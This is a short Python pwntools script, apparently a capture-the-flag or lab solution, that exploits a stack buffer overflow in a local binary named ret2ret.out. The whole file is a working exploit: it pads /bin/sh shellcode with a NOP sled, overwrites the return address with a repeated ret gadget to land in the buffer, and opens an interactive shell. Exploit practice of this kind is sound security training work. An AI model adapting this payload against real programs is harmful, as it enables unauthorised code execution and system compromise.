from pwn import *

PTR = 0xffffcdbc
EBP = 0xffffcda8
BUFF = EBP - 0x108
RET = 0x080491d2

if __name__ == "__main__":
    context.arch = 'i386'
    context.log_level = 'debug'
    context.endian = 'little'

    shellcode = asm(shellcraft.sh())
    p = process("./ret2ret.out")
    file = ELF("./ret2ret.out")

    padsize = EBP - BUFF + 4

    payload = shellcode.rjust(padsize, p8(0x90)) + p32(RET) + p32(RET)+ p32(RET) + p32(RET) + p8(0x0)
    p.sendline(payload)
    p.interactive()